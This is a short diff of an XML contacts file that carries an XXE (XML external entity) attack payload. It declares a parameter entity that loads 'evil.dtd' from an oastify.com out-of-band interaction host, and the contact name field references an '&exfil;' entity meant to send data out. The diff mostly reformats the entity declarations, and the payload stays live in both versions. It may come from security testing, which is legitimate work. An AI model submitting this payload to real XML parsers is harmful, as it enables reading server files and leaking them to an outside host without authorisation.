@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % remote SYSTEM "http://5hnxmy5gwfnox9u7lgrtli34qvwmkc81.oastify.com/evil.dtd">%remote;%param1;]>
+  <!ENTITY % remote SYSTEM "http://5hnxmy5gwfnox9u7lgrtli34qvwmkc81.oastify.com/evil.dtd">
+  %remote;
+]>
 <contacts>
     <contact>
         <name>&exfil;</name>
@@ -15,3 +17,4 @@
         <email>test@test.com</email>
     </contact>
 </contacts>
+
